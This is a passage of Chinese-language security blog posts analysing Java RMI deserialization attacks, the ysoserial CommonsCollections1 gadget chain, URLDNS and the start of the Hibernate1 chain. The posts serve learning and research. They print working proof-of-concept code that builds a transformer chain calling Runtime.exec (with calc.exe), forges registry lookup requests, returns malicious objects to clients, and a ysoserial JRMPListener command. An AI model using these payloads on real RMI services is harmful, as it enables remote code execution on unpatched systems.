} LiveRef liveRef = new LiveRef(new ObjID(ObjID.REGISTRY_ID), new TCPEndpoint(host, port, csf, null), false); RemoteRef ref = (csf == null) ? new UnicastRef(liveRef) : new UnicastRef2(liveRef); return (Registry) Util.createProxy(RegistryImpl.class, ref, false); } 如果没有提供 IP 和端口，默认使用本机地址和 1099 端口，然后将它们封装到 LiveRef 对象中，和 createRegistry 时类似。不过后面将这个对象放入 UnicastRef 而不是 UnicastServerRef。\n进入 createProxy 方法，再到 createStub 方法：\n通过反射得到 RegistryImpl_Stub 对象，并将远程通信需要的 IP 和端口信息保存到 ref 属性中。\nServer 创建注册中心后，server 端通过 bind 方法注册远程对象。\nregistry.bind(\u0026quot;User\u0026quot;, new UserImpl()); 然而此时 registry 线程并没有收到 socket 请求，也没有触发反序列化过程🤔\n前面提到通过 createRegistry 获取到的是 RegistryImpl 对象，看一下它的 bind 方法：\n由此可见 RegistryImpl 对象是对本地的注册中心进行操作，自然不涉及 socket 和序列化，只需要将注册对象添加到哈希表(this.bindings)中即可。\n改为使用 getRegistry 获取注册中心，此时返回的是 RegistryImpl_Stub 对象，它的 bind 方法如下：\npublic void bind(String var1, Remote var2) throws AccessException, AlreadyBoundException, RemoteException { try { RemoteCall var3 = super.ref.newCall(this, operations, 0, 4905912898345647071L); try { ObjectOutput var4 = var3.getOutputStream(); var4.writeObject(var1); var4.writeObject(var2); } catch (IOException var5) { throw new MarshalException(\u0026quot;error marshalling arguments\u0026quot;, var5); } super.ref.invoke(var3); super.ref.done(var3); } catch (RuntimeException var6) { throw var6; } catch (RemoteException var7) { throw var7; } catch (AlreadyBoundException var8) { throw var8; } catch (Exception var9) { throw new UnexpectedException(\u0026quot;undeclared checked exception\u0026quot;, var9); } } newCall 方法的第二个参数 operations 保存着一个列表，对应着 registry 的各种操作：\n可以看到 bind 对应的下标是 0，而此时第三个参数(opnum)也是 0。\n跟进 newCall：\n在 193 行和 registry 进行通信，获取 Connection 对象，在创建 StreamRemoteCall 对象时传进参数 0，让 registry 知道要执行的是 bind 操作。\n这时候跟进一下 registry 的代码，在拿到 socket 对象后继续执行，并创建一个 ConnectionHandler 线程来处理请求。\n从 ConnectionHandler#run 跟进到 TCPTransport#handleMessages，函数栈如下：\n在 switch 语句中创建一个 StreamRemoteCall 对象，并传入当前的 TCPConnection 对象：\n跟进 TCPTransport#serviceCall，获取 ObjID 和 Target 对象，然后调用 UnicastServerRef#dispatch 方法：\n当 this.skel 不为 null，就调用 UnicastServerRef#oldDispatch：\n接着执行 this.skel.dispatch() ，即 RegistryImpl_Skel#dispatch，该方法包括处理请求的核心逻辑：\nswitch 语句的参数 var3 就是 server 端传过来的 opnum，对应的操作在之前的截图中。\n可以看到 bind 和 rebind 都有反序列化的过程，lookup 和 unbind 也存在反序列化，但由于参数是 String 类型，并不能直接利用。\n上图的 var6 是 RegistryImpl 对象，因此最终还是会执行 RegistryImpl#bind 方法。\n回到 server 端，即 RegistryImpl_Stub#bind 方法中，向输出流写入序列化后的远程对象和它的名称。执行 super.ref.invoke() 发送请求给 registry，由 RegistryImpl_Skel#dispatch 处理请求。\nClient client 端和 server 端的通信发生在调用远程对象的方法时，在此之前需要通过 RegistryImpl_Stub#lookup 从注册中心获取封装好的代理对象。\n调用远程对象的任意方法时，都会先调用 RemoteObjectInvocationHandler#invoke：\n上图判断调用的方法是不是所有对象共有的，如果不是就执行 invokeRemoteMethod。\n接着调用 LiveRef#invoke 方法(由 lookup 获取)，把 proxy、method、args 以及 method 的 hash 传过去：\n跟进 LiveRef#invoke：\n获取到 Connection 对象后，调用 marshaValue 将远程方法的参数序列化写入到连接中：\n接着将输出流的数据发送到 server 端，获取响应后调用 unmarsharValue 进行反序列化：\n在 server 端负责处理请求的方法是 UnicastServerRef#dispatch，调用 unmarshaValue 对参数进行处理：\n如果参数是一个对象，在 unmarshaValue 中会将其反序列化，然后通过反射调用远程方法。\n后面的流程就不继续跟进了，我们已经知道 client 端和 server 端通信时调用了 unmarshaValue 方法进行反序列化相关操作，这也正是攻击的入口点。\n攻击途径 前文大致分析了一下 Java RMI 中各个角色是怎么进行交互的，以及代码执行过程中一些涉及到反序列化的点。下面就针对这些反序列化的点进行模拟攻击，以此了解针对 Java RMI 服务都有哪些常见的攻击途径。\n攻击时所使用的 POP 链是 CommonsCollections1，可以在这篇文章了解一下。先写一个 Poc 类方便生成恶意对象：\npublic class Poc { Remote getObject() throws Exception { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026quot;getMethod\u0026quot;, new Class[] {String.class, Class[].class}, new Object[] {\u0026quot;getRuntime\u0026quot;, new Class[0]}), new InvokerTransformer(\u0026quot;invoke\u0026quot;, new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0] }), new InvokerTransformer(\u0026quot;exec\u0026quot;, new Class[] {String.class}, new Object[] {\u0026quot;calc.exe\u0026quot;}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\u0026quot;value\u0026quot;, \u0026quot;zrquan\u0026quot;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); Class AnnotationInvocationHandlerClass = Class.forName(\u0026quot;sun.reflect.annotation.AnnotationInvocationHandler\u0026quot;); Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class); cons.setAccessible(true); InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap); // 用Remote代理对象封装evalObject return Remote.class.cast(Proxy.newProxyInstance(Remote.class.getClassLoader(), new Class[] { Remote.class }, evalObject)); } } 由于 RMI 很多方法的参数都是 Remote 类型，所以要用 Remote 类型的代理对象封装 evalObject，当代理对象反序列化时，evalObject 也会进行反序列化。\nServer/Client \u0026ndash;\u0026gt; Registry 先看看 registry 中最容易利用的两个方法 bind 和 rebind，它们会对接收到的序列化对象进行反序列化：\n通过 Poc#getObject 生成恶意对象，调用 bind 方法(rebind 类同)传给 registry。\nRegistry registry = LocateRegistry.getRegistry(3333); registry.bind(\u0026quot;User\u0026quot;, (new Poc()).getObject()); RegistryImpl_Skel#dispatch 处理请求：\n反序列化 AnnotationInvocationHandler 对象，调用 var5.setValue() 方法：\n调用 ChainedTransformer#transform，触发命令执行：\n接下来尝试利用 lookup 方法(unbind 类同)，它接收的是 String 参数，不能直接传递恶意对象。\n但前面的分析过程我们已经知道，RegistryImpl_Skel#dispatch 是通过一个数字来判断执行什么操作的，所以它并不能判断我们传过去的是不是 String 对象，那我们仿照 lookup 方法的逻辑来发送恶意对象不就好了。\n看一下 RegistryImpl_Stub#lookup 方法的关键操作：\n通过以下代码伪造 lookup 请求：\nRegistry registry = LocateRegistry.getRegistry(3333); // 获取super.ref Field[] fields_0 = registry.getClass().getSuperclass().getSuperclass().getDeclaredFields(); fields_0[0].setAccessible(true); UnicastRef ref = (UnicastRef) fields_0[0].get(registry); // 获取operations Field[] fields_1 = registry.getClass().getDeclaredFields(); fields_1[0].setAccessible(true); Operation[] operations = (Operation[]) fields_1[0].get(registry); // 模仿lookup方法 RemoteCall var2 = ref.newCall((RemoteObject) registry, operations, 2, 4905912898345647071L); ObjectOutput var3 = var2.getOutputStream(); var3.writeObject(Poc.getObject()); ref.invoke(var2); 此外，还可以通过 RASP 技术 hook 请求代码，修改发送的数据。\nRegistry \u0026ndash;\u0026gt; Server/Client 远程获取注册中心后，是通过 RegistryImpl_Stub 对象来进行操作的。我们前面分析过 RegistryImpl_Stub#bind 方法，双方会相互传输序列化的数据，自然伴随着反序列化的过程，那么注册中心也就可以返回恶意数据完成对 client 或 server 端的攻击。\n可以用 ysoserial 搭建恶意的 registry，我用高版本 jdk 时会报错，用 jdk8 就可以运行。\njava -cp ysoserial.jar ysoserial.exploit.JRMPListener 12321 CommonsCollections1 'calc.exe' 在恶意 registry 执行 list 方法后，客户端的调用栈：\n看到 StreamRemoteCall#executeCall 方法中有反序列化操作，跟进一下：\n客户端在 switch 语句中对输入流进行了反序列化，在这个过程会被恶意 registry 攻击。其实在执行 bind、unbind 这些 void 方法时，正常情况是走到 case 1 里直接返回的，不过 var1 也是从输入流读取的，所以恶意 registry 完全可以控制 switch 的走向。\n其余的 lookup、bind、rebind、unbind 方法同样可以被恶意 registry 攻击。\nServer \u0026ndash;\u0026gt; Client 当远程方法的返回值是对象时，server 端可以通过返回一个恶意对象对 client 端进行反序列化攻击。\n现在给 User 接口添加一个 attackClient 方法，该方法返回 Object 对象：\npublic Object attackClient() throws RemoteException try { Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026quot;getMethod\u0026quot;, new Class[] {String.class, Class[].class}, new Object[] {\u0026quot;getRuntime\u0026quot;, new Class[0]}), new InvokerTransformer(\u0026quot;invoke\u0026quot;, new Class[] {Object.class, Object[].class}, new Object[] {null, new Object[0] }), new InvokerTransformer(\u0026quot;exec\u0026quot;, new Class[] {String.class}, new Object[] {\u0026quot;calc.exe\u0026quot;}) }; Transformer transformerChain = new ChainedTransformer(transformers); Map innerMap = new HashMap(); innerMap.put(\u0026quot;value\u0026quot;, \u0026quot;zrquan\u0026quot;); Map outerMap = TransformedMap.decorate(innerMap, null, transformerChain); Class AnnotationInvocationHandlerClass = Class.forName(\u0026quot;sun.reflect.annotation.AnnotationInvocationHandler\u0026quot;); Constructor cons = AnnotationInvocationHandlerClass.getDeclaredConstructor(Class.class, Map.class); cons.setAccessible(true); InvocationHandler evalObject = (InvocationHandler) cons.newInstance(java.lang.annotation.Retention.class, outerMap); return (Object) evalObject; } catch (InstantiationException e) { e.printStackTrace(); } catch (InvocationTargetException e) { e.printStackTrace(); } catch (NoSuchMethodException e) { e.printStackTrace(); } catch (IllegalAccessException e) { e.printStackTrace(); } catch (ClassNotFoundException e) { e.printStackTrace(); } return null; 注册好远程对象后，在 client 端调用 attackClient 方法时调用栈如下：\n在 UnicastRef#unmarshalValue 方法中触发反序列化，成功在 client 端执行命令。\nClient \u0026ndash;\u0026gt; Server 相应的，当远程方法的参数是对象时，client 端也可以通过输入一个恶意对象对 server 端进行反序列化攻击。\n再给 User 接口添加一个 attackServer 方法，它的参数是一个 Object 对象：\npublic void attackServer(Object obj) throws RemoteException { System.out.println(obj); } 为了方便起见(懒)，直接用刚刚的 attackClient 来生成恶意对象。client 端的代码如下：\npublic class UserClient { public static void main(String[] args) throws Exception{ Registry reigstry = LocateRegistry.getRegistry(3333); Object evilObj = (new UserImpl()).attackClient(); User user = (User) reigstry.lookup(\u0026quot;User\u0026quot;); user.attackServer(evilObj); } } 代码执行后，看一下 server 线程的调用栈：\nUnicastServerRef#dispatch 负责处理 client 端的请求，同样是在 UnicastRef#unmarshalValue 方法中触发反序列化。\n最后 本文介绍了 Java RMI 中的三个角色——注册中心、服务端和客户端。简单地分析了它们在进行交互时代码的执行过程，弄清楚反序列化会在什么时候发生，从而学习如何去进行攻击。\n但实际上，在 JDK9 中引入了 JEP 290 后，对 RMI 的反序列化漏洞利用不再像本文那么简单直接。关于 JEP 290 的知识会在之后的文章中分享。\n","date":"2021-03-08","permalink":"https://zrquan.github.io/posts/java-rmi/","tags":["java"],"title":"Java RMI"},{"content":"Commons Collections Java Collections Framework 是 JDK1.2 中添加的类库，提供了很多集合相关的数据结构、接口、算法等，并成为了 Java 中公认的集合处理标准。\nCommons Collections 则是 Apache 开发的第三方库，扩展了 Java 标准集合库的功能特性。其中一个重要的特性是：\nTransforming decorators that alter each object as it is added to the collection Commons Collections 实现了一个 TransformedMap 类，该类是对 Java 标准数据结构 Map 接口的扩展。该类可以在一个元素被加入到集合内时，自动对该元素进行特定的修饰变换，具体的变换逻辑由 Transformer 类定义，Transformer 在 TransformedMap 实例化时作为参数传入。\norg.apache.commons.collections.Transformer 这个类可以满足固定的类型转化需求，其转化函数可以自定义实现，漏洞触发函数就是在于这个点。1\nPOC 首先看一下 CommonsCollections1#getObject 方法，该方法用来构造恶意对象：\npublic InvocationHandler getObject(final String command) throws Exception { final String[] execArgs = new String[] { command }; // 初始化ChainedTransformer final Transformer transformerChain = new ChainedTransformer( new Transformer[]{ new ConstantTransformer(1) }); // Transformer数组，构成恶意代码的关键 final Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026quot;getMethod\u0026quot;, new Class[] { String.class, Class[].class }, new Object[] { \u0026quot;getRuntime\u0026quot;, new Class[0] }), new InvokerTransformer(\u0026quot;invoke\u0026quot;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026quot;exec\u0026quot;, new Class[] { String.class }, execArgs), new ConstantTransformer(1) }; final Map innerMap = new HashMap(); // 用于触发transformers的转化逻辑 final Map lazyMap = LazyMap.decorate(innerMap, transformerChain); final Map mapProxy = Gadgets.createMemoitizedProxy(lazyMap, Map.class); final InvocationHandler handler = Gadgets.createMemoizedInvocationHandler(mapProxy); Reflections.setFieldValue(transformerChain, \u0026quot;iTransformers\u0026quot;, transformers); return handler; } 上面的代码中，利用到的和 transformer 特性相关的类有 3 个：\nInvokerTransformer：通过反射机制实现转化，返回新实例。 ConstantTransformer：将输入的常量原封不动地返回。 ChainedTransformer：其 iTransformers 属性是一个 transformer 数组，可以依次执行每个元素的 transform 方法，且前一方法的返回值会作为后一方法的输入。 我们需要用到 InvokerTransformer#transform 中的反射机制来执行代码，该方法的关键逻辑如下：\nClass cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); input 是调用方法时的参数，而 iMethodName、iParamTypes、iArgs 属性受我们控制。不难看出，如果想要调用 Runtime#exec 来执行命令，需要满足以下条件：\ninput 是 Runtime 类的实例 this.iMethodName = \u0026ldquo;exec\u0026rdquo; this.iParamTypes = String.class this.iArgs = command 满足后三点并没有难度，因为这三个属性值都可以被序列化，完全由我们控制。但正常情况下，目标不可能用 Runtime 实例作为参数，我们需要想办法控制 input 的值。\n另外要知道的是，Runtime 类使用了单例模式，所以它的构造函数是私有的，不能通过 new 来获取实例，只能通过 Runtime#getRuntime 方法。所以我们要解决的关键问题是使 input 等效于：\nClass.forName(\u0026quot;java.lang.Runtime\u0026quot;).getMethod(\u0026quot;getRuntime\u0026quot;).invoke(Class.forName(\u0026quot;java.lang.Runtime\u0026quot;)) ChainedTransformer 想要控制 input 的值，需要利用 ChainedTransformer 类，其关键的 transform 方法如下：\npublic Object transform(Object object) { for(int i = 0; i \u0026lt; this.iTransformers.length; ++i) { object = this.iTransformers[i].transform(object); } return object; } this.iTransformers 属性是一个 transformer 数组，我们可以利用该属性多次执行 InvokerTransformer#transform 方法。由于执行方法的返回值会作为下一次执行的输入，而这个返回值我们是可以一定程度上控制的，以此来达到控制 input 值的目的。\n换句话说，我们现在将目的巧妙地转换成使返回值：\nmethod.invoke(input, this.iArgs); 等效于我们想要的 input 值：\nClass.forName(\u0026quot;java.lang.Runtime\u0026quot;).getMethod(\u0026quot;getRuntime\u0026quot;).invoke(Class.forName(\u0026quot;java.lang.Runtime\u0026quot;)) 回顾一下 InvokerTransformer#transform：\nClass cls = input.getClass(); Method method = cls.getMethod(this.iMethodName, this.iParamTypes); return method.invoke(input, this.iArgs); 现在是不是觉得，只要让 cls 变量等于 Runtime.class 就大功告成了呢。但仔细一想，这不就回到开头说的要 input 为 Runtime 类的实例吗😵\n既然我们可以通过 ChainedTransformer#transform 控制 input 值，那想办法在前面的循环中使返回值是 Runtime 类的实例不就好了？比如利用前面提到的 ConstantTransformer 类：\n只要在 transformer 数组添加元素 new ConstantTransformer(Runtime.getRuntime()) ，下一次循环的输入就是 Runtime 实例。\n然而 Runtime 类没有实现 Serializable 接口：\n反射 我们没有办法让 Runtime 对象序列化，但可以序列化 Runtime.class ，也就是 java.lang.Class 的对象。假设将 input 的值设为 Runtime.class ，我们可以利用下面的语句得到 Runtime#getRuntime：\nClass cls = input.getClass(); // cls == java.lang.Class Method method = cls.getMethod(\u0026quot;getMethod\u0026quot;, paramTypes); return method.invoke(input, new Object[] {\u0026quot;getRuntime\u0026quot;, new Class[0] }); 现在我们得到了 Runtime#getRuntime 的 Method 对象，再通过以下语句执行这个方法：\nClass cls = input.getClass(); // input == Method(getRuntime) Method method = cls.getMethod(\u0026quot;invoke\u0026quot;, paramTypes); return method.invoke(input, args); 这里巧妙地利用 invoke 方法来执行 invoke 方法，目的是将 invoke 的执行对象和参数转化成我们能控制的 input 和 args 变量。\n我们调试一下 ysoserial 的 poc，以便于理解。关键的 transformer 数组如下：\nfinal Transformer[] transformers = new Transformer[] { new ConstantTransformer(Runtime.class), new InvokerTransformer(\u0026quot;getMethod\u0026quot;, new Class[] { String.class, Class[].class }, new Object[] { \u0026quot;getRuntime\u0026quot;, new Class[0] }), new InvokerTransformer(\u0026quot;invoke\u0026quot;, new Class[] { Object.class, Object[].class }, new Object[] { null, new Object[0] }), new InvokerTransformer(\u0026quot;exec\u0026quot;, new Class[] { String.class }, execArgs), new ConstantTransformer(1) }; 首先是 ConstantTransformer#transform 方法，返回 Runtime.class ：\n第一次调用 InvokerTransformer#transform，获取 Runtime#getRuntime 的 Method 对象：\n第二次调用 InvokerTransformer#transform，返回 Runtime 对象：\n上图还注意到了 this.iArgs 第一个值是 null，这对应着 invoke 方法的第一个参数，按理来说这应该是目标方法所在的对象，也就是 Runtime 对象。\n这里有一个知识点，当 invoke 调用的目标方法是静态方法时，第一个参数将无关紧要，目标类的相关信息已经在之前的步骤获取了。\n比如在上面的执行流程中，第一次调用 InvokerTransformer#transform 获取 Runtime#getRuntime 时的 input 变量就是 Runtime.class\n第三次调用 InvokerTransformer#transform，执行恶意代码：\n现在我们只要调用 ChainedTransformer#transform，就能执行恶意代码了，剩下的问题就是怎么让目标自动调用这个方法了。\n触发点 LazyMap 期望目标在反序列化过程中直接执行 ChainedTransformer#transform 是不太现实的，我们需要通过更常规的操作来触发这一方法，比如 Map 数据结构的相关操作。\n正好 Commons Collections 中提供了两个类，TransformedMap 和 LazyMap。它们的作用有点相似，都可以修饰一个 Map 数据，当对该 Map 数据进行操作时会触发 transform 过程。\n因为 ysoserial 中用的是 LazyMap，所以只分析一下它的利用方法。它的 get 方法如下：\npublic Object get(Object key) { if (!super.map.containsKey(key)) { Object value = this.factory.transform(key); super.map.put(key, value); return value; } else { return super.map.get(key); } } 在第 3 行调用了一个 transform 方法，而 this.factory 可以在构造函数中赋值，我们将它设置为 ChainedTransformer 对象，然后想办法触发这个 get 方法。\nAnnotaionInvocationHandler AnnotaionInvocationHandler 类的反序列过程中有 Map 的相关操作，可以利用它来触发 LazyMap#get。注意，在 JDK8 之后它的 readObject 方法更新了(diff)，下面的方法就用不了了。2\n首先看一下 getObject 方法中的代码：\n红框的代码利用了两层的动态代理来封装 lazyMap 对象，相关方法如下：\n第一次调用 createMemoitizedProxy 生成 mapProxy 代理对象，将 lazyMap 赋给它的 handler 的 memberValues 属性。\n第二次调用 createMemoizedInvocationHandler 生成 handler 对象，将 mapProxy 赋给 memberValues 属性。\n关系大致如下：\nhandler.memberValues == mapProxy mapProxy.handler.memberValues == lazyMap 反序列化 最后看一看反序列化的过程，也就是 AnnotaionInvocationHandler#readObject 的执行流程。\n这时的 this.memberValues 是 mapProxy 代理对象，调用它的 entrySet 方法会执行其 handler 的 invoke 方法。\n来到 AnnotationInvocationHandler#invoke，注意这时的 this 和之前是不同实例了，而 this.memberValues 就是 lazyMap 对象。\n可以看到在 invoke 方法这调用了 lazyMap#get，成功执行命令。\nhttps://xz.aliyun.com/t/7031\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nhttps://juejin.cn/post/6844903997011132423\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n","date":"2021-03-02","permalink":"https://zrquan.github.io/posts/ysoserial-cc1/","tags":["java","deserialize"],"title":"Ysoserial-CommonsCollections1"},{"content":"URLDNS 是一个比较简单的 POP 链，而且只能发送 DNS 请求，不能直接 RCE，所以本来是不想写这篇文章的。不过完整学习了这个链的代码后，发现 ysoserial 的一些代码和技巧对于深入了解 Java 十分有帮助，还是有必要记录一下。\n构造 payload URLDNS 链通过反序列化 HashMap 对象来触发，获取恶意对象的 getObject 方法如下：\npublic Object getObject(final String url) throws Exception { //Avoid DNS resolution during payload creation //Since the field \u0026lt;code\u0026gt;java.net.URL.handler\u0026lt;/code\u0026gt; is transient, it will not be part of the serialized payload. URLStreamHandler handler = new SilentURLStreamHandler(); HashMap ht = new HashMap(); // HashMap that will contain the URL URL u = new URL(null, url, handler); // URL to use as the Key ht.put(u, url); //The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup. //During the put above, the URL's hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered. Reflections.setFieldValue(u, \u0026quot;hashCode\u0026quot;, -1); return ht; } SilentURLStreamHandler 是一个静态内部类，继承 URLStreamHandler，并重写了 openConnection 和 getHostAddress 方法。\nstatic class SilentURLStreamHandler extends URLStreamHandler { protected URLConnection openConnection(URL u) throws IOException { return null; } protected synchronized InetAddress getHostAddress(URL u) { return null; } } 这个内部类的作用是用来避免漏洞误判，因为 payload 的构造过程中也会触发一次 DNS 请求，而我们希望 DNS 请求只在反序列化的过程中触发，以确定反序列化过程是否存在漏洞。\n那 SilentURLStreamHandler 是怎么阻止第一次 DNS 请求的呢？我们跟进到 ht.put(u, url) 中：\n来到 hashCode() 方法，这里会对 hashCode 变量进行判断，如果不是 -1 的话会直接返回。因为 hashCode 的默认值就是 -1 ，所以这里会调用 handler.hashCode(this) 。\n注意此时的 handler 是 SilentURLStreamHandler 的实例。\n执行到上图的 359 行，调用 getHostAddress 方法，如果此时的 handler 是 URLStreamHandler 类的实例，则会发起 DNS 请求来获取 IP。\n然而此时执行的是 SilentURLStreamHandler.getHostAddress ，直接返回 null，避免了在反序列化前发送 DNS 请求。\n执行 ht.put(u, url) 之后，URL 对象的 hashcode 会被修改，前面说过如果 hashCode 不是-1，会在 handler.hashCode(this) 前返回，所以我们要将它重新设成-1。\n至此我们构造了一个 HashMap 的实例，并将一个 URL 类的实例设置为它的 key；value 则是我们输入的 url，实际上 value 对利用过程没有影响，只要是能被序列化的类就行。\n反序列化过程 入口点和 Hibernate1 链一样，在 HashMap.readObject 中。在方法的最后，通过 for 循环获取每个 key 和 value，并调用了 hash() ：\n接下来的执行过程和前面 ht.put(u, url) 差不多，因为前面通过反射机制重置了 hashCode，所以仍然进入到 handler.hashCode() 中。\n和之前一样执行到 getHostAddress 方法，但这次的 handler 并不是 SilentURLStreamHandler 的实例，因此顺利发送 DNS 请求。\ntransient 关键字 反序列化时，handler 变量并不是 SilentURLStreamHandler 的实例，是因为 URL.handler 变量是用 transient 关键字修饰的。\n当序列化一个实现了 Serilizable 接口的类实例时，用 transient 修饰的变量不会被序列化。在实际的开发中，经常会用 transient 修饰一些敏感的数据(密码、证件号等)，避免将这些数据序列化后通过网络传输。\n以下示例代码使用 transient 修饰 User 类的 password 变量，序列化保存到文件后再反序列化获取 User 实例，此时输出的 password 为 null，因为该变量没有被序列化。\n示例代码 public class demo { public static void main(String[] args) { User user = new User(); user.setName(\u0026quot;zrquan\u0026quot;); user.setPassword(\u0026quot;qwe123\u0026quot;); //序列化 try{ ObjectOutputStream os = new ObjectOutputStream(new FileOutputStream(\u0026quot;user.txt\u0026quot;)); os.writeObject(user); os.flush(); os.close(); } catch (FileNotFoundException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } //反序列化 try{ ObjectInputStream is = new ObjectInputStream(new FileInputStream(\u0026quot;user.txt\u0026quot;)); user = (User) is.readObject(); is.close(); System.out.println(\u0026quot;After deserialized: \u0026quot;); System.out.println(\u0026quot;username: \u0026quot; + user.getName()); System.err.println(\u0026quot;password: \u0026quot; + user.getPassword()); } catch (FileNotFoundException e) { e.printStackTrace(); } catch (IOException e) { e.printStackTrace(); } catch (ClassNotFoundException e) { e.printStackTrace(); } } } class User implements Serializable { public String name; private transient String password; public String getName() { return name; } public void setName(String name) { this.name = name; } public String getPassword() { return password; } public void setPassword(String password) { this.password = password; } } 💡 使用 transient 要注意以下几点：\n被修饰的变量将不再是对象持久化的一部分，该变量的值在序列化后无法获取。 只能修饰变量，不能修饰方法和类。且本地变量不能被修饰，只能修饰实现了 Serializable 接口的类的成员变量。 静态变量不管是否被 transient 修饰，都不能被序列化。 transient 用来避免实现了 Serilizable 接口的类的变量被序列化，对实现 Externalizable 接口的类没有影响。 ","date":"2021-01-28","permalink":"https://zrquan.github.io/posts/ysoserial-urldns/","tags":["java","deserialize"],"title":"Ysoserial-URLDNS"},{"content":"Hibernate 是 Java 的一个对象关系映射(ORM)框架，使用 GNU 开源协议。该利用链以 HashMap 为入口点，通过 hibernate-core 包中的多个类及其方法构成调用路径，最终执行事先写入到 TemplatesImpl 类中的命令。\n动态字节码 ysoserial 在构造 payload 时，利用了 Java 的动态字节码生成的技术，所以我们先稍微了解一下。\n众所周知，Java 是一门需要编译的语言，JVM 读取并运行的是编译后的 .class 字节码文件。但有时候我们想要在程序运行中动态修改一些代码，比如热补丁、接口升级、IDE 在调试时读取或修改变量等等需求。如果每次都要把程序停掉再重新编译，显然不太现实，而通过 Java 动态字节码技术，就可以直接修改字节码文件，再通过相关接口加载到 JVM 中，实现运行时的代码修改。\n常见的动态字节码修改有两种方式：\nASM，可以直接操作字节码，执行效率高，相对的门槛也比较高，需要对 Java 的字节码文件有所了解，熟悉 JVM 的编译指令。 Javassit，由东京技术学院的 Shigeru Chiba 创作的开源类库，提供了更抽象的 API 来对字节码进行操作。Hibernate1 利用链中也正是使用这个类库来构造 payload。 Javassit demo 下面的示例代码通过 Javassit 构造了一个 Someone 类，并添加了方法和属性。然后将该类实例化，并调用其 toString 方法。\n示例代码 import javassist.*; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; public class demo { public static void main(String[] args) { ClassPool classPool = ClassPool.getDefault(); //定义Someone类 CtClass ccSomeone = classPool.makeClass(\u0026quot;Someone\u0026quot;); try { //定义成员变量name CtClass fieldType = classPool.get(\u0026quot;java.lang.String\u0026quot;); CtField cfName = new CtField(fieldType, \u0026quot;name\u0026quot;, ccSomeone); cfName.setModifiers(Modifier.PRIVATE); //用private修饰name ccSomeone.addField(cfName, CtField.Initializer.constant(\u0026quot;init\u0026quot;)); //添加name到Someone中，初始值为init //定义构造方法 CtClass[] parameters = new CtClass[]{classPool.get(\u0026quot;java.lang.String\u0026quot;)}; //参数为String类型 CtConstructor constructor = new CtConstructor(parameters, ccSomeone); String body = \u0026quot;{this.name=$1;}\u0026quot;; //方法体，$1表示的第一个参数 constructor.setBody(body); ccSomeone.addConstructor(constructor); //设置为Someone的构造方法 //setName和getName方法 ccSomeone.addMethod(CtNewMethod.setter(\u0026quot;setName\u0026quot;,cfName)); ccSomeone.addMethod(CtNewMethod.getter(\u0026quot;getName\u0026quot;,cfName)); //toString 方法 CtClass returnType = classPool.get(\u0026quot;java.lang.String\u0026quot;); //返回类型为 String String methodName = \u0026quot;toString\u0026quot;; CtMethod cmToString = new CtMethod(returnType, methodName, null, ccSomeone); cmToString.setModifiers(Modifier.PUBLIC); //用 public 修饰 String methodBody = \u0026quot;{return \\\u0026quot;My name is \\\u0026quot;+$0.name;}\u0026quot;; //方法体，$0 表示 this cmToString.setBody(methodBody); ccSomeone.addMethod(cmToString); //获取 Someone 类的实例，设置 name 属性，调用 toString 方法 Class clazz = ccSomeone.toClass(); Constructor cons = clazz.getConstructor(String.class); Object someone = cons.newInstance(\u0026quot;zrquan\u0026quot;); //通过构造方法设置 name Method toString = clazz.getMethod(\u0026quot;toString\u0026quot;); System.out.println(toString.invoke(someone)); } catch (NotFoundException | CannotCompileException | NoSuchMethodException e) { e.printStackTrace(); } catch (IllegalAccessException e) { e.printStackTrace(); } catch (InstantiationException e) { e.printStackTrace(); } catch (InvocationTargetException e) { e.printStackTrace(); } } } 构造 payload 我们先看一下最主要的 getObject 方法，这个方法完成了对要执行的命令的“包装”，并返回包含该命令的对象。\npublic Object getObject ( String command ) throws Exception { Object tpl = Gadgets.createTemplatesImpl(command); Object getters = makeGetter(tpl.getClass(), \u0026quot;getOutputProperties\u0026quot;); return makeCaller(tpl, getters); } 其中 makeGetter 和 makeCaller 都是内部函数，而 makeGetter 其实只起到路由作用，真正的逻辑代码在内部函数 makeHibernate4Getter 和 makeHibernate5Getter 中。\n首先跟进一下 createTemplatesImpl 方法：\n该方法先对系统属性 properXalan 进行了判断——如果返回 false，则通过反射机制获取 TemplatesImpl、AbstractTranslet、TransformerFactoryImpl 三个类的全局限定类名，将其作为参数，调用重载的 createTemplatesImpl 方法；如果返回 true，就使用上述三个类的非全局限定类名作为参数调用重载方法。\n在重载的 createTemplatesImpl 方法中，通过 Javassit 库创建一个 StubTransletPayload 类，并将我们要执行的命令添加到这个类的静态代码块，当这个类被加载时，我们写入的命令就会执行。\n可以看到在 116 行，调用 CtClass.makeClassInitializer() 创建一个空的静态代码块，再通过 insertAfter() 将命令插入到静态代码块末尾。\n代码的 119 和 120 行给 StubTransletPayload 设置了父类 AbstractTranslet，但其实没有必要，因为 StubTransletPayload 本身就继承了 AbstractTranslet。\n方法的最后将 StubTransletPayload 实例转换成 byte 数组，赋给 templates 变量的 _bytecodes 属性，并设置了 _name 和 _tfactory 属性。\n返回的 templates 变量是 TemplatesImpl 类的实例，执行完 createTemplatesImpl 后，它的结构大致如下图所示：\n接下来执行的代码是 makeGetter 方法：\nObject getters = makeGetter(tpl.getClass(), \u0026quot;getOutputProperties\u0026quot;); 首先通过系统属性判断当前的 hibernate 版本，ysoserial 使用的是 4.3 版本，所以直接跳到 makeHibernate4Getter 函数。\n这一部分比较简单，通过反射机制创建了一个 